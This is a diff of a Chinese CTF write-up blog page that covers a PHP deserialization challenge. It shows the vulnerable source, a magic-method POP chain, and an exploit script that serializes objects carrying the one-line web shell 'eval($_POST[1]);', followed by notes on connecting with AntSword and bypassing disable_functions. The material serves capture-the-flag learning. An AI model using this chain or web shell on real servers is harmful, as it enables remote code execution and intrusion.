+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Do</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$You</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$love</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$web</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">web</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">web</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">love</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">execurise</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Do</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Parar</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$execurise</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$lead</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$hansome</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lead</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_readable</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;还想直接读flag，洗洗睡吧，rce去&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">execurise</span><span class="o">==</span><span class="s2">&#34;man!&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;居然没坠机&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hansome</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">execurise</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;你也想被肘吗&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Starven</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$girl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$friend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;试试所想的呗，说不定成功了&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">girl</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$args1</span><span class="p">,</span><span class="nv">$args2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$func</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">friend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$func</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SYC</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$lover</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$forever</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__isset</span><span class="p">(</span><span class="nv">$args</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">forever</span><span class="o">-&gt;</span><span class="na">nononon</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$Syclover</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;Syclover&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$Syclover</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$Syclover</span><span class="p">));</span><span class="c1">//unserialize() 返回的对象没有被赋值给变量，因此它立即成为临时对象，PHP 会销毁它，触发 __destruct，所以这里不需要走GC垃圾回收触发 __destruct
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;None&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;怎么不给我呢，是不喜欢吗？&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">怎么不给我呢，是不喜欢吗？</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>链子很简单</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__destruct-&gt;__set-&gt;__toString-&gt;__get-&gt;__isset-&gt;__call-&gt;__invoke
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">lhRaMK7</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Do</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$You</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$love</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$web</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">web</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">web</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">love</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;1111&#34;</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">execurise</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Do</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Parar</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$execurise</span><span class="o">=</span><span class="s2">&#34;man!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$lead</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$hansome</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;222&#34;</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lead</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_readable</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;还想直接读flag，洗洗睡吧，rce去&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">execurise</span><span class="o">==</span><span class="s2">&#34;man!&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;居然没坠机&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hansome</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">execurise</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;你也想被肘吗&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Starven</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$girl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$friend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;333&#34;</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;试试所想的呗，说不定成功了&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">girl</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$args1</span><span class="p">,</span><span class="nv">$args2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;555&#34;</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$func</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">friend</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$func</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SYC</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$lover</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$forever</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__isset</span><span class="p">(</span><span class="nv">$args</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;444&#34;</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">forever</span><span class="o">-&gt;</span><span class="na">nononon</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">lhRaMK7</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">=</span><span class="k">new</span> <span class="nx">Parar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">lead</span><span class="o">=</span><span class="k">new</span> <span class="nx">Starven</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">lead</span><span class="o">-&gt;</span><span class="na">girl</span><span class="o">=</span><span class="k">new</span> <span class="nx">Parar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">lead</span><span class="o">-&gt;</span><span class="na">girl</span><span class="o">-&gt;</span><span class="na">hansome</span><span class="o">=</span><span class="k">new</span> <span class="nx">SYC</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">lead</span><span class="o">-&gt;</span><span class="na">girl</span><span class="o">-&gt;</span><span class="na">hansome</span><span class="o">-&gt;</span><span class="na">forever</span><span class="o">=</span><span class="k">new</span> <span class="nx">Starven</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">lead</span><span class="o">-&gt;</span><span class="na">girl</span><span class="o">-&gt;</span><span class="na">hansome</span><span class="o">-&gt;</span><span class="na">forever</span><span class="o">-&gt;</span><span class="na">friend</span><span class="o">=</span><span class="k">new</span> <span class="nx">lhRaMK7</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">You</span><span class="o">-&gt;</span><span class="na">lead</span><span class="o">-&gt;</span><span class="na">girl</span><span class="o">-&gt;</span><span class="na">hansome</span><span class="o">-&gt;</span><span class="na">forever</span><span class="o">-&gt;</span><span class="na">friend</span><span class="o">-&gt;</span><span class="na">love</span><span class="o">=</span><span class="s1">&#39;eval($_POST[1]);&#39;</span><span class="p">;</span><span class="c1">#不能直接赋值给web，否则反序列化后wakeup中love给web赋值为空，所以直接给love赋值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开始执行<code>phpinfo();</code>,发现disable_function如下，那就打入一句话木马那就用蚁剑插件连。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exec,system,shell_exec,popens,popen,curl_exec,curl_multi_exec,proc_open,proc_get_status,,readfile,unlink,dl,memory_get_usage,dl,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,linkopen_basedir 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250727152311365.png" alt="image-20250727152311365" style="zoom:50%;" />
+<p><a class="link" href="https://www.cnblogs.com/DumpInfou/p/18023278"  target="_blank" rel="noopener"
+    >绕过disable_functions的限制 - DumpInfou - 博客园</a></p>
+
 </section>
 
 
@@ -2264,6 +3245,19 @@
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2025-7%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-7月每日一题</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="">
@@ -2312,19 +3306,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-HNCTF</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-fxzctf/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-FXZCTF</h2>
         </div>
     </a>
 </article>
